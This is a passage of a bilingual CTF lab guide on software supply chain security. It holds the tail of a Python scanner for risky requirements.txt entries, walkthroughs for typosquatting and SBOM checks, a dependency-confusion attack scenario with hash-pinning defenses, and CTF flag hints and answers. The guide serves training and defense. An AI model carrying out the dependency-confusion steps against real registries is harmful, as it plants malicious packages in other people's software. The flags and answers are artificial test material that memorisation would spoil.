            continue

        # 해시 옵션 제거
        if " --hash=" in line:
            line = line.split(" --hash=")[0].strip()

        # 환경 마커 제거
        if ";" in line:
            line = line.split(";")[0].strip()

        # 버전 파싱
        name = re.split(r'[>=<!~\[]', line)[0].strip()
        version = ""
        if "==" in line:
            version = line.split("==")[1].split()[0].strip()
        elif ">=" in line:
            version = ">=" + line.split(">=")[1].split()[0].strip()

        if name:
            risk = check_package_risks(name, version)
            results.append(risk)

    return results


def generate_report(risks: list[PackageRisk], output_format: str = "text") -> str:
    """위험 보고서 생성."""
    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    sorted_risks = sorted(risks, key=lambda r: severity_order.get(r.severity, 4))

    if output_format == "json":
        data = [
            {
                "name": r.name,
                "version": r.version,
                "severity": r.severity,
                "risks": r.risks,
                "flags": r.flags,
            }
            for r in sorted_risks
            if r.risks
        ]
        return json.dumps(data, indent=2, ensure_ascii=False)

    lines = ["공급망 보안 스캔 보고서", "=" * 50, ""]
    critical = [r for r in sorted_risks if r.severity == "CRITICAL"]
    high = [r for r in sorted_risks if r.severity == "HIGH"]
    medium = [r for r in sorted_risks if r.severity == "MEDIUM"]

    lines.append(f"총 {len(risks)}개 패키지 분석:")
    lines.append(f"  CRITICAL: {len(critical)}개")
    lines.append(f"  HIGH:     {len(high)}개")
    lines.append(f"  MEDIUM:   {len(medium)}개")
    lines.append("")

    for risk in sorted_risks:
        if not risk.risks:
            continue
        lines.append(f"[{risk.severity}] {risk.name}=={risk.version}")
        for r in risk.risks:
            lines.append(f"  - {r}")
        if risk.flags:
            for flag in set(risk.flags):
                lines.append(f"  >>> 플래그: {flag}")
        lines.append("")

    return "\n".join(lines)


def main() -> None:
    parser = argparse.ArgumentParser(description="requirements.txt 공급망 보안 스캐너")
    parser.add_argument("req_file", type=Path, help="requirements.txt 경로")
    parser.add_argument("--format", choices=["text", "json"], default="text")
    parser.add_argument("-o", "--output", type=Path, help="결과 저장 경로")
    parser.add_argument("--min-severity", choices=["LOW", "MEDIUM", "HIGH", "CRITICAL"],
                        default="MEDIUM", help="최소 표시 위험도")

    args = parser.parse_args()

    if not args.req_file.exists():
        print(f"파일 없음: {args.req_file}")
        sys.exit(1)

    risks = scan_requirements(args.req_file)
    report = generate_report(risks, args.format)

    if args.output:
        args.output.write_text(report, encoding="utf-8")
        print(f"[+] 보고서 저장: {args.output}")
    else:
        print(report)

    # 종합 플래그
    all_flags = set()
    for risk in risks:
        all_flags.update(risk.flags)
    if all_flags:
        print("\n[+] 획득 가능한 CTF 플래그:")
        for flag in sorted(all_flags):
            print(f"  {flag}")


if __name__ == "__main__":
    main()
```

---

## 실습 체크리스트

```
공급망 CTF 과제
☐ 악성 패키지 코드에서 C2 서버 URL 추출
☐ 타이포스쿼팅 패키지 5개 식별
☐ requirements.txt에서 고정되지 않은 버전 패키지 찾기
☐ SBOM에서 CVSS 9.0+ 취약점 발견
☐ 패키지 해시 검증으로 변조 탐지
☐ CI/CD 파이프라인 인젝션 시나리오 분석
☐ Base64 난독화된 악성 코드 디코딩
☐ 의존성 혼동 공격 시뮬레이션
☐ OSV.dev API로 실제 취약점 확인
```

공급망 보안의 핵심은 **신뢰 연쇄(Chain of Trust)** 유지다. 모든 의존성은 해시로 고정하고, SBOM을 자동 생성·분석해야 한다.

---

<a name="english"></a>

# Supply Chain Security CTF Lab

---

## Supply Chain Security Basics — Beginner's Guide

### What Is a Software Supply Chain?

A software supply chain is the chain of every component that goes into building an application: not just the code you write, but also external libraries, build tools, and CI/CD pipelines.

**Analogy:** Think of the food supply chain. The bread you buy at a grocery store has passed through a wheat farm → mill → bakery → distributor. Contamination at any stage affects the end consumer. Software is the same.

```
Software Supply Chain Structure

Developer Code
    │
    ├── Open Source Libraries (npm, PyPI, Maven...)
    │     └── Typosquatting, dependency confusion, malicious packages
    │
    ├── Build System (GitHub Actions, Jenkins...)
    │     └── Pipeline injection, secret key exposure
    │
    ├── Container Images (Docker Hub, ECR...)
    │     └── Malicious base images, backdoor injection
    │
    └── Deployment Environment
          └── No integrity verification, unsigned artifacts
```

### Real-World Supply Chain Attack Examples

| Incident | Year | Attack Method | Impact |
|----------|------|---------------|--------|
| SolarWinds | 2020 | Build system infiltration | 18,000 companies affected |
| event-stream | 2018 | Malicious npm package | Bitcoin wallet theft |
| ua-parser-js | 2021 | npm account takeover | Cryptominer deployment |
| PyPI typosquatting | Ongoing | Similar package names | Credential leakage |
| Codecov | 2021 | CI/CD script tampering | Environment variable theft |
| 3CX | 2023 | Build pipeline compromise | Customer system infiltration |

---

## CTF Supply Chain Challenge Types

### Approach by Challenge Type

```
Type 1: Typosquatting Detection
  - Find spelling errors in package names
  - Calculate edit distance (Levenshtein Distance)
  - Approach: Analyze full requirements.txt, compare to popular packages

Type 2: Malicious Package Analysis
  - Decode obfuscated code
  - Extract C2 server URLs
  - Approach: AST analysis, trace base64 decoding

Type 3: SBOM Vulnerability Discovery
  - Find CVEs in software component list
  - Approach: Parse SBOM → map versions to CVEs

Type 4: Dependency Confusion
  - Register internal package names in public registry
  - Approach: Identify internal package names → register with higher version

Type 5: Build Pipeline Analysis
  - Detect security issues in CI/CD files
  - Approach: Analyze .github/workflows/*.yml
```

---

## Challenge 1: Malicious Package Analysis

(See full Python code in Korean section above)

Key concepts demonstrated:
- Typosquatting detection ("reqeusts" instead of "requests")
- Static analysis of suspicious patterns (eval, exec, base64 decoding)
- Detection of C2 communication URLs
- Credential theft via environment variable access
- Scoring system with CTF flags

---

## Challenge 2: SBOM Analysis

(See full Python code in Korean section above)

Key vulnerable components in the scenario:
- log4j 2.14.0 — CVE-2021-44228 (Log4Shell, JNDI injection RCE, CVSS 10.0)
- openssl 1.0.2k — CVE-2022-0778 (Infinite loop DoS, CVSS 7.5)
- requests 2.6.0 — CVE-2018-18074 (Credential exposure, CVSS 7.5)
- django 3.2.0 — CVE-2021-33203 (Path traversal, CVSS 4.9)
- pillow 8.3.1 — CVE-2021-34552 (Buffer overflow, CVSS 9.8)

---

## Challenge 3: Typosquatting Detection Walkthrough

### Step-by-Step Solution Guide

Typosquatting tricks developers who mistype a package name into installing a malicious package.

```
Real Attack Scenario:
  Developer intends: import requests
  Typo: pip install reqeusts  ← 'e' and 's' swapped
  Result: Malicious package installed!
```

**Walkthrough:**

```bash
# Step 1: Check suspicious requirements.txt
cat requirements.txt
# Output:
# reqeusts==2.28.0        <- typo!
# numpy==1.24.0
# panads==2.0.0           <- typo! (pandas)
# django==4.2.0

# Step 2: Run analysis tool
python3 supply_chain_ctf.py requirements requirements.txt
# Output:
# [!] Risks found (2):
#   [HIGH] typosquatting: reqeusts -> requests (edit distance: 1)
#   [HIGH] typosquatting: panads -> pandas (edit distance: 1)
# [+] Flag: CTF{typosquatting_risk_found}

# Step 3: Check individual package
python3 supply_chain_ctf.py typo reqeusts
# Output:
# [!] Typosquatting risk:
#   'reqeusts' -> requests (edit distance: 1)
# [+] Flag: CTF{typosquatting_reqeusts}
```

---

## Challenge 4: Dependency Confusion Lab Setup

### What Is Dependency Confusion?

Dependency confusion registers an internal package name in a public registry (PyPI, npm) with a higher version number, causing the malicious package to be automatically installed.

```
Internal system setup:
  Company internal PyPI: http://internal-pypi.company.com
  Internal package: company-utils==1.0.0

Attacker action:
  Register company-utils==9.9.9 on public PyPI (malicious)

pip behavior (picks highest version):
  pip install company-utils
  → Installs 9.9.9 from public PyPI first!
  → Malicious package installed
```

### Defense Mechanism

```bash
# Pin versions AND use hashes in requirements.txt
company-utils==1.0.0 \
    --hash=sha256:abc123... \
    --index-url http://internal-pypi.company.com/simple/

# Or use --require-hashes flag
pip install -r requirements.txt --require-hashes
```

---

## Challenge 5: SBOM Generation and Analysis

### What Is an SBOM?

An SBOM (Software Bill of Materials) is a complete list of all components in a software product — like a food ingredient label for software.

```
SBOM Format Comparison

CycloneDX (OWASP Standard):
  - JSON/XML format
  - Can include vulnerability information
  - Includes license information

SPDX (Linux Foundation Standard):
  - ISO 5962:2021 international standard
  - Strong for legal license analysis
  - High SBOM interoperability

Both formats recommended
```

### SBOM Usage Examples

```bash
# Generate SBOM from requirements.txt
python3 sbom_tool.py generate --requirements requirements.txt \
    --project my-app --output sbom.json

# Generate SBOM from current environment
python3 sbom_tool.py generate --installed --project dev-env --output env_sbom.json

# Check SBOM for vulnerabilities
python3 sbom_tool.py vulncheck sbom.json
```

---

## Challenge 6: Python Tool to Scan requirements.txt for Suspicious Packages

The scanner performs multiple checks on each package entry:

| Check | Trigger | Severity |
|-------|---------|----------|
| Known malicious blacklist | Package in KNOWN_MALICIOUS set | CRITICAL |
| Typosquatting | Edit distance <= 2 from popular package | HIGH |
| Unpinned version | No == version specifier | MEDIUM |
| Flexible version | >=, ~= constraints | MEDIUM |
| Suspicious name pattern | Numeric suffix, generic names | MEDIUM |

```bash
# Run the scanner
python3 req_scanner.py requirements.txt --min-severity HIGH

# Get JSON output for integration
python3 req_scanner.py requirements.txt --format json -o scan_results.json
```

---

## CTF Flag Hints

| Challenge | Hint | Flag Pattern |
|-----------|------|-------------|
| Malicious package | Look for _exfil() function | CTF{malicious_package_detected} |
| C2 communication | Find the URL in base64 | CTF{c2_communication_found} |
| Credential theft | Check os.environ access | CTF{credential_theft_detected} |
| Typosquatting | Compare edit distances | CTF{typosquatting_PACKAGE_NAME} |
| SBOM critical vuln | CVSS >= 9.0 components | CTF{critical_vuln_CVE_YEAR_XXXXX} |
| Package integrity | Hash mismatch detection | CTF{tampered_package_detected} |

---

## Practice Checklist

```
Supply Chain CTF Tasks
☐ Extract C2 server URL from malicious package code
☐ Identify 5 typosquatting packages
☐ Find unpinned version packages in requirements.txt
☐ Discover CVSS 9.0+ vulnerabilities in SBOM
☐ Detect tampering via package hash verification
☐ Analyze CI/CD pipeline injection scenario
☐ Decode Base64 obfuscated malicious code
☐ Simulate dependency confusion attack
☐ Verify actual vulnerabilities via OSV.dev API
```

The core of supply chain security is maintaining the **Chain of Trust**. All dependencies must be hash-pinned, and SBOMs must be automatically generated and analyzed.
